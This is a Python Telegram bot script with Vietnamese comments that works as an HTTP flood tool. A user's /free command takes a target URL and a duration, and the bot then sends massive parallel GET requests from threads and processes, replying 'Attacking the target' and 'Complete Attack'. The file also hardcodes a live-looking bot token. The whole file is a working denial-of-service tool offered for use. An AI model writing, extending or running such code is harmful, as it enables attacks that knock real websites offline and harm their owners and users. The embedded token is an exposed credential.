import telebot
import requests
import time
import psutil
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

# Khởi tạo colorama
init(autoreset=True)

# Token của bot Telegram
TOKEN = "7667637653:AAFPm8zpxwqSSFEt6k2iT7rDjcMosZz_1HE"
bot = telebot.TeleBot(TOKEN)

# Hàm gửi một yêu cầu HTTP
def send_request(url):
    try:
        response = requests.get(url, timeout=2)
        print(Fore.GREEN + f"Trạng thái {response.status_code}")
    except requests.RequestException as e:
        print(Fore.RED + f"Lỗi - {str(e)}")

# Hàm gửi yêu cầu HTTP theo nhóm
def send_batch_requests(url, batch_size):
    with ThreadPoolExecutor(max_workers=batch_size) as executor:
        for _ in range(batch_size):
            executor.submit(send_request, url)

# Hàm chính gửi yêu cầu HTTP liên tục trong thời gian quy định, với 3 tiến trình song song
def send_requests_with_time_limit(url, duration):
    start_time = time.time()
    batch_size = 1200
    
    # Hàm chạy song song trong mỗi tiến trình
    def run_tab():
        with multiprocessing.Pool(processes=5) as pool:  # Giới hạn tiến trình là 5 để tránh quá tải
            while time.time() - start_time < duration:
                pool.apply_async(send_batch_requests, (url, batch_size))

    # Tạo 3 tiến trình song song (3 "tab" chạy cùng lúc)
    processes = []
    for _ in range(3):
        process = multiprocessing.Process(target=run_tab)
        process.start()
        processes.append(process)

    # Đợi cả 3 tiến trình hoàn thành
    for process in processes:
        process.join()

    print(Fore.YELLOW + f"Hoàn thành gửi yêu cầu tới {url} trong {duration} giây với 3 tab.")

# Lệnh /start để chào mừng người dùng
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Chào mừng!\nVui lòng dùng lệnh /free .")

# Lệnh /free để gửi yêu cầu HTTP theo URL và thời gian người dùng yêu cầu
@bot.message_handler(commands=['free'])
def free(message):
    try:
        # Tách tin nhắn thành các phần tử
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "Vui lòng cung cấp URL và thời gian. Ví dụ: /free http://example.com 60")
            return
        
        url = args[1]
        duration = int(args[2])
        
        bot.reply_to(message, f"⚔️Attacking the target⚔️\n↣Link: {url}\n↣Time: {duration}s")
        
        # Gửi yêu cầu HTTP với 3 "tab" chạy song song
        send_requests_with_time_limit(url, duration)
        
        bot.reply_to(message, f"⚔️Complete Attack⚔️\n↣Link: {url}\n↣Time: {duration}s")
    except ValueError:
        bot.reply_to(message, "Thời gian phải là một số nguyên dương. Vui lòng thử lại.")
    

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    # Tiếp tục xử lý lệnh cpu ở đây
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')


# Khởi động bot
bot.infinity_polling(timeout=60, long_polling_timeout = 1)